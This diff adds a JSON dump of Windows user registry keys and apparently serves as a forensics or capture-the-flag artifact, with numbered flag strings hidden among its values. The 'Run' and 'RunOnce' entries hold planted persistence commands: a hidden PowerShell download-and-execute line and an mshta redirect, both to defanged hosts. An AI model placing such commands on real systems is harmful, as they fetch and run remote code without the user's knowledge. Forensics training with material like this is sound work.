+                            "Windows.Defender": "System",
+                            "Windows.Defender.MpUxDlp": "System",
+                            "Windows.Defender.SecurityCenter": "System",
+                            "windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel": "app:immersive",
+                            "Windows.PrintDialog_cw5n1h2txyewy!Microsoft.Windows.PrintDialog": "app:immersive",
+                            "Windows.System.AppInitiatedDownload": "System",
+                            "Windows.System.Audio": "System",
+                            "Windows.System.Continuum": "System",
+                            "Windows.System.DialServer": "System",
+                            "Windows.System.MiracastReceiver": "System",
+                            "Windows.System.NearShareExperienceReceive": "System",
+                            "Windows.System.ShareExperience": "System",
+                            "Windows.SystemToast.AccountHealth": "System",
+                            "Windows.SystemToast.AudioTroubleshooter": "System",
+                            "Windows.SystemToast.AutoPlay": "System",
+                            "Windows.SystemToast.BackgroundAccess": "System",
+                            "Windows.SystemToast.BackupReminder": "System",
+                            "Windows.SystemToast.BdeUnlock": "System",
+                            "Windows.SystemToast.BitLockerPolicyRefresh": "System",
+                            "Windows.SystemToast.Bthprops": "System",
+                            "Windows.SystemToast.BthQuickPair": "System",
+                            "Windows.SystemToast.Calling": "System",
+                            "Windows.SystemToast.Calling.SystemAlertNotification": "System",
+                            "Windows.SystemToast.CameraTroubleshooter": "System",
+                            "Windows.SystemToast.CloudExperienceHostLauncherCustom": "System",
+                            "Windows.SystemToast.Compat": "System",
+                            "Windows.SystemToast.DefaultAudioEndpoint": "System",
+                            "Windows.SystemToast.DeviceConsent": "System",
+                            "Windows.SystemToast.DeviceEnrollmentActivity": "System",
+                            "Windows.SystemToast.DeviceManagement": "System",
+                            "Windows.SystemToast.Devices": "System",
+                            "Windows.SystemToast.DevicesFlow": "System",
+                            "Windows.SystemToast.DisplayBroker": "System",
+                            "Windows.SystemToast.DisplaySettings": "System",
+                            "Windows.SystemToast.EnterpriseDataProtection": "System",
+                            "Windows.SystemToast.Explorer": "System",
+                            "Windows.SystemToast.FodHelper": "System",
+                            "Windows.SystemToast.HelloFace": "System",
+                            "Windows.SystemToast.LanguageSettings": "System",
+                            "Windows.SystemToast.LocationManager": "System",
+                            "Windows.SystemToast.LowDisk": "System",
+                            "Windows.SystemToast.MobilityExperience": "System",
+                            "Windows.SystemToast.NfpAppAcquire": "System",
+                            "Windows.SystemToast.NfpAppLaunch": "System",
+                            "Windows.SystemToast.NfpDevicePairing": "System",
+                            "Windows.SystemToast.NfpReceiveContent": "System",
+                            "Windows.SystemToast.PinConsent": "System",
+                            "Windows.SystemToast.PresenceSensing.OnlookerDetection": "System",
+                            "Windows.SystemToast.Print.Notification": "System",
+                            "Windows.SystemToast.Print.PrinterCleanupTask": "System",
+                            "Windows.SystemToast.Print.PrintNotification": "System",
+                            "Windows.SystemToast.RasToastNotifier": "System",
+                            "Windows.SystemToast.RecallSetup": "System",
+                            "Windows.SystemToast.SecurityAndMaintenance": "System",
+                            "Windows.SystemToast.SecurityCenter": "System",
+                            "Windows.SystemToast.ServiceInitiatedHealing.Notification": "System",
+                            "Windows.SystemToast.Share": "System",
+                            "Windows.SystemToast.SoftLanding": "System",
+                            "Windows.SystemToast.SpeechServices": "System",
+                            "Windows.SystemToast.StartupApp": "System",
+                            "Windows.SystemToast.StorSvc": "System",
+                            "Windows.SystemToast.Suggested": "System",
+                            "Windows.SystemToast.SuggestedActions": "System",
+                            "Windows.SystemToast.Usb.Notification": "System",
+                            "Windows.SystemToast.WiFiNetworkManager": "System",
+                            "Windows.SystemToast.WindowsTip": "System",
+                            "Windows.SystemToast.WindowsUpdate.MoNotification": "System",
+                            "Windows.SystemToast.WindowsUpdate.MoNotification2": "System",
+                            "Windows.SystemToast.Wwansvc": "System"
+                        },
+                        "wpnidm": "C:\\Users\\User\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpnidm"
+                    },
+                    "Run": "powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb",
+                    "RunOnce": "cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&note=hash-value-2-8_5cd4'</script>",
+                    "SearchSettings": {
+                        "Appearance": {
+                            "bing": {
+                                "{b4076d8c-473b-4dd0-bfd5-cd6452c2e7c2}": {
+                                    "taskbarSearchBox": {
+                                        "icons": "https://www.bing.com/th?id=ODSWG.df319ec1-75ca-4f3b-a2f6-7862b60e7368&pid=dsb"
+                                    }
+                                }
+                            },
+                            "Current": "{00000000-0000-0000-0000-000000000000}"
+                        }
+                    },
+                    "ThemeManager": "NormalSize",
+                    "Themes": {
+                        "HighContrast": "C:\\Windows\\resources\\Themes\\aero.theme"
+                    },
+                    "Uninstall": {
+                        "OneDriveSetup.exe": "https://go.microsoft.com/fwlink/?LinkID=223554"
+                    }
+                },
+                "Shell": {
+                    "Associations": {
+                        "UrlAssociations": {
+                            "bingmaps": {
+                                "UserChoice": "hFco6xxc9vE=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXp9gkwccvk6fa6yyfq3tmsk8ws2nprk1p"
+                                }
+                            },
+                            "ftp": {
+                                "UserChoice": "2uWOR1WTRL0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            "http": {
+                                "UserChoice": "FA9rbuR2DOQ=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            "https": {
+                                "UserChoice": "ey7KulrwS5Y=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            "mailto": {
+                                "UserChoice": "1FkhiCvE5wA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXbx2ce4vcxjdhff3d1ms66qqzk12zn827"
+                                }
+                            },
+                            "microsoft-edge": {
+                                "UserChoice": "7DYHMK0lPgE=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            "microsoft-edge-holographic": {
+                                "UserChoice": "/wMvbiACe1Q=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            "ms-outlook": {
+                                "UserChoice": "5CRiBFzdcPc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX1scw7cgxcz9hmq03sd8qajzg3s9t7901"
+                                }
+                            },
+                            "ms-screenclip": {
+                                "UserChoice": "XxwXeHZJphw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXfeq5vwnakrw6cy02kzhq8ekhhsremh62"
+                                }
+                            },
+                            "ms-xbl-3d8b930f": {
+                                "UserChoice": "VbBr/Yl6EuI=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            "mswindowsmusic": {
+                                "UserChoice": "DiSu7fDUIgs=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXtggqqtcfspt6ks3fjzyfppwc05yxwtwy"
+                                }
+                            },
+                            "mswindowsvideo": {
+                                "UserChoice": "uN2ZA2NIs+U=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX6w6n4f8xch1s3vzwf3af6bfe88qhxbza"
+                                }
+                            },
+                            "read": {
+                                "UserChoice": "chIrugbZyQk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            }
+                        }
+                    },
+                    "Bags": {
+                        "1": {
+                            "Desktop": "{00000000-0000-0000-0000-000000000000}"
+                        }
+                    },
+                    "BrandedKey": "App"
+                },
+                "ShellNoRoam": {
+                    "MUICache": "Microsoft Management Console - component#7of8-99bb"
+                },
+                "Winlogon": {
+                    "PasswordExpiryNotification": "PasswordNeverExpires"
+                }
+            },
+            "Windows NT": {
+                "CurrentVersion": {
+                    "AppCompatFlags": {
+                        "Layers": "~ PERPROCESSSYSTEMDPIFORCEOFF"
+                    },
+                    "Devices": "winspool,Ne00:",
+                    "Fonts": {
+                        "Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\CascadiaMonoItalic.ttf"
+                    },
+                    "PrinterPorts": "winspool,Ne00:,15,45",
+                    "Winlogon": "1"
+                }
+            },
+            "Windows Search": {
+                "ProcessedSearchRoots": {
+                    "0001": "file:///C:\\",
+                    "0003": "csc://{S-1-5-21-2943804080-2887740447-2979721861-1001}/",
+                    "0004": "defaultroot://{S-1-5-21-2943804080-2887740447-2979721861-1001}/",
+                    "0005": {
+                        "Default": "C:\\Users\\User\\Searches\\winrt--{S-1-5-21-2943804080-2887740447-2979721861-1001}-.searchconnector-ms"
+                    }
+                }
+            },
+            "Wisp": {
+                "Pen": {
+                    "SysEventParameters": {
+                        "FlickCommands": "{00000000-0000-0000-0000-000000000000}"
+                    }
+                }
+            }
+        },
+        "RegisteredApplications": {
+            "PackagedApps": "Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\Repository\\Packages\\Clipchamp.Clipchamp_3.0.10220.0_neutral__yxz26nhyzhsrt\\App\\Capabilities"
+        },
+        "VMware, Inc.": {
+            "VMware Tools": {
+                "Hgfs Usability": {
+                    "MRU RootShare": "\\\\vmware-host\\Shared Folders"
+                }
+            }
+        },
+        "Wow6432Node": {
+            "Microsoft": {
+                "Active Setup": {
+                    "Installed Components": {
+                        "{6BF52A52-394A-11d3-B153-00C04F79FAA6}": "EN"
+                    }
+                }
+            }
+        }
+    },
+    "System": {
+        "GameConfigStore": {
+            "Children": {
+                "0522abd6-82a9-407a-93da-22db68a54d20": "c30126d9-4cac-461a-b331-faa613447906",
+                "0ed6e5f9-5c70-4c71-977b-b1ac7b5eb9bc": "2121740635",
+                "174af894-473b-4df9-98eb-c964a2f81ca7": "8d004e80-bdd8-4c3e-8cb4-019d0cf8d853",
+                "1d2bcb3d-a833-442c-ba67-b80987169c36": "2089711717",
+                "24d9b08c-ed53-4815-a88f-9b7dfeb6a0b9": "1bd35aab-53f0-4c90-b02d-43b35ad0558f",
+                "289571cc-fecc-475b-9c7e-1176e50b6c8c": "1621910926",
+                "29f5b387-f063-4b91-83c1-a7c90fe5bb45": "1742142364",
+                "2b1ede6f-86d6-4815-920b-215d0f220589": "1974701886",
+                "2beb5334-68a2-4b5b-98cb-80a37890a73b": "ae3c86a2-7376-4637-93a1-aa820620f4c4",
+                "2cdf4a3a-f872-40d1-810b-c672b16efa65": "1918679142",
+                "2d28d2b7-8964-4694-b400-4e8bf0d93781": "1644611974",
+                "3182e977-86de-47b6-90d3-b1da094111e4": "435cba56-1372-4889-9c57-d3ddd83acf19",
+                "32db7cd9-b0ac-4103-9262-832e7c82da66": "1847408598",
+                "34130181-1806-4a7b-a1ba-a62b044d36ac": "1824168350",
+                "3626548a-1ddc-4bd7-938f-ae1da3b2bbdb": "a4286e55-653c-44e0-a6c0-cd84a34cb443",
+                "3714e7c2-43cc-446f-855f-6aca98ee5345": "1698925306",
+                "3b333fde-ec84-4244-9730-a9ed71193c3a": "2054493965",
+                "3d64e2fa-f6dd-43e2-9fa8-409147d29f1d": "c15abc17-7207-4ade-9b9c-562a39214d93",
+                "3da97345-ebb5-4111-9f14-66a38ed9e631": "1967200449",
+                "40ccd027-6323-4b04-adcd-a591c7f7489b": "2040962988",
+                "41dc5435-60ac-459c-a9ab-664b66b630fb": "1918679142",
+                "434b1647-3d17-4044-9116-b3eb79d53841": "1698925306",
+                "4bbbc1e4-3b46-4e80-8295-07ef2f77dd5b": "1816266845",
+                "4ec6897d-215c-42f6-b60e-8d5d21391d03": "1840192853",
+                "4f235384-9a89-47a5-8476-4c5609a3c4f4": "2040962988",
+                "4f7b06b5-a30e-4a76-a191-aee2a7daa8c4": "2058206598",
+                "5125c5f8-2905-428a-b129-6bfdc4d52440": "1836790356",
+                "5159a42a-0a36-4000-943a-8e626e1abf00": "2121740635",
+                "54b14cbd-d218-4911-a606-180bbb6a09bc": "3e2b01f2-e8ea-487c-88de-367befa71d31",
+                "54d9cd6e-cc6b-4735-9bb8-3b4153f17d52": "2065318711",
+                "552e60f1-0e9e-4c63-8564-066cc7dea187": "1769864145",
+                "55ad0d9c-559c-4a86-b7e9-ac3b439ebf18": "2089711717",
+                "56d91201-fe3c-4222-ab82-aa09991875f7": "2040962988",
+                "5790c546-5e00-4c11-bb39-ed339ad67885": "1995066354",
+                "5c365392-0ab2-45d1-b890-ad7ea4db52de": "1877036175",
+                "5e58caba-20be-40f6-80f0-39645004c78e": "6ca7da87-c753-42b2-9e7c-3bc3dc0d2d70",
+                "61602874-c34c-4e8a-a3e7-1763ff91f726": "1732322725",
+                "634cec97-b8f1-45ee-94aa-a135bae35fe5": "3fad1c1c-779f-4145-a96e-d891937192ee",
+                "63c78ebf-a1ec-470f-bfa8-b93575607a06": "1862446374",
+                "69dfc3a3-6d55-439e-b2fa-2e3fa3f136f7": "9be2fcac-3003-4cdf-aa39-cfbf8873a767",
+                "6f73f7ef-47a2-475d-80f7-a598b8082f82": "2104127235",
+                "746b87e1-7f31-4638-a5ad-f5d65156c47c": "1732322725",
+                "7578e1be-3191-4de0-bb5d-881daf4b8721": "f8ba01d9-5d4b-477c-a990-669b6bf7c46a",
+                "7697ba52-b790-4dd0-add9-f130fdd149ef": "1788842502",
+                "7a6416c0-3e51-4e88-a63f-60ff0c7d3eda": "71c1ecb2-f6a2-404b-abfd-8c52821b8f4e",
+                "7b54d791-ef51-477e-b40e-1036e27f747f": "1698925306",
+                "8270d2ad-c0f4-416f-8e72-8998dcbe4ec0": "2063743247",
+                "841f6d6f-4af1-49dd-99be-74a45257383d": "1667877464",
+                "85cfb915-608f-485c-ab78-833324020b55": "2119592325",
+                "877e5261-d0df-4fc8-a185-f3709999a66d": "1742142364",
+                "8a7b0cdc-ed23-48be-bc23-294e687f6497": "70902df7-97fa-45d3-9394-ab959442f825",
+                "8f1ee7a8-b617-4107-949d-c8f04f8686f5": "1891787507",
+                "901401f9-6ff3-4d2c-9234-f3eb4bd95ce5": "2066051089",
+                "91e22a03-b438-4b48-855e-bb2cb603417d": "1956642556",
+                "99752a2b-2090-4c3e-9486-ac9e951a5996": "2036175044",
+                "9b138189-2513-423a-8069-1c8b4e95bca8": "2066051089",
+                "9cbaa47f-e8b8-4dec-9849-742f67dfdf17": "1698925306",
+                "9e39c221-83f1-4f68-a081-7b6168582b89": "91a87aa1-cb05-44e8-9758-192c6a74c4cd",
+                "a0892222-85a0-4a95-9aee-e9c891e1578f": "ce3bea7f-cb4f-4fd9-85b8-1f0b062ab4a6",
+                "a0aeed05-1f0c-4ca1-ae32-c0459b6fad37": "1819120761",
+                "a1184927-e29e-4fc0-9e31-352ff569b92a": "1621796646",
+                "a151c87a-b107-4702-9b13-ff6956252285": "2068593342",
+                "a2ebe1b7-aef3-4af4-8083-49f009478afa": "9f82169b-703d-492a-b648-3ac4e894a140",
+                "a5db9cc6-0a0d-4354-b3b7-a8de48b870f3": "1885819086",
+                "a9146c4b-d447-4087-aa6b-7d0faa38e798": "1663203563",
+                "ab45a7e8-94da-4f6c-8d88-44e966817f88": "247ff9d8-2050-4fec-9997-928f8ade4df9",
+                "ae66721b-2b46-46b8-940a-b60f3682e533": "f88c02e3-b10b-4e88-8123-aab6733c236e",
+                "b04ff225-b7d7-4cc5-8008-9ecaf182b443": "4b2e0e33-943e-4010-86ff-35270e2b0d83",
+                "b1e3922b-8f8b-41f0-ba17-7672a5907b16": "654bfb26-b735-40da-b206-ccff74a55181",
+                "ba4bb7d5-d520-42be-bf3b-0f65ec67775a": "1732322725",
+                "c0ac3fea-c19c-4b7a-b44e-4f9122c9ab8e": "2089711717",
+                "c2e43133-dd40-464f-bc7c-c0b2d95848a1": "1998214169",
+                "c5878cf3-2e2b-48b3-84d0-90fe5a53f8b6": "2063743247",
+                "c6e4b4bd-f468-46a1-bee1-c4805e7abc9e": "2040254664",
+                "c8acfe57-0c6d-4bd7-b508-3622fe24d1b3": "1635723607",
+                "caad4729-14ab-418a-ad63-523329f3c468": "2014204696",
+                "cadac109-9238-40c2-9c64-4ebf449de602": "9ca553c0-fa0e-4ae2-a47a-c6cd51dd3b46",
+                "cb366660-65f2-4f38-9479-b6ec77362328": "d462329a-a831-42b3-809b-6ce39187b369",
+                "cd1d1721-31e2-41c8-b2e3-902e265509c5": "1828893758",
+                "cf47b388-d945-4de3-acd9-40b2e65e3d29": "742c9a3c-3041-4edd-be1d-ce23d2e8de0c",
+                "d335f724-5cfb-4f3f-971e-c42750a9a668": "1769864145",
+                "d4619632-169c-455d-8e07-58c0155c43b0": "1918679142",
+                "dc0263b4-5691-4eb2-b1f8-d49e16c5dca8": "1784128183",
+                "dc1c047f-9f03-46cc-a38a-af66cd152cc8": "1781682593",
+                "dde84db3-0b70-418c-af74-e7d25c5fd392": "1956642556",
+                "de28ab86-8b3b-4d5f-ac58-6782424ddfd0": "4e876f0f-fc32-4464-bcb5-6090b4ab36a5",
+                "df281460-3ecd-42d3-8adf-2bd06b2989ba": "64fd29a7-54d3-4005-b31b-1e0f455a9795",
+                "e162126b-6362-4d52-94ed-6f76903d5482": "1847408598",
+                "e1aabfce-47ec-41e2-a659-55a764d82906": "0a7b1129-06ec-49b3-b3cb-7bcab1043941",
+                "e3b7c9e1-3ae7-48db-9836-f27469ffa359": "1801033410",
+                "e42532a2-d5b8-4f26-976f-d696030194e8": "1788842502",
+                "e4fa90bf-1622-4940-8737-8420fba9c016": "1828893758",
+                "ea199b14-ef1b-403f-b800-301c2ba14ac4": "2013577527",
+                "ec1ac039-0aa3-4c51-8a7e-365b5a409eb2": "1769864145",
+                "ec1b2f6c-5525-4342-8a90-7cc0facea735": "2067772105",
+                "eebe8329-b036-4064-86c7-f96e7a489733": "1625658903",
+                "f4085bdb-c5e4-4c0c-9dd8-1161edb32d93": "2119592325",
+                "f6471073-21ed-4a57-b658-a0a20a91ac12": "1732322725",
+                "f70e3e3e-94cf-4641-9abd-055f2e65306d": "1788842502",
+                "fa1feb79-df15-49f0-a07b-bafce3ee1734": "1698999151",
+                "fa424376-0676-40c6-9395-f19f69ac8096": "1862446374",
+                "fccaf923-ab4a-4ef5-9ca8-72f9654ecd68": "539759fd-ad01-42ba-a8a5-a9868b3620b0",
+                "fd2029fc-2adf-433c-8c29-0c812518b03d": "2142217006"
+            }
+        }
+    }
+}
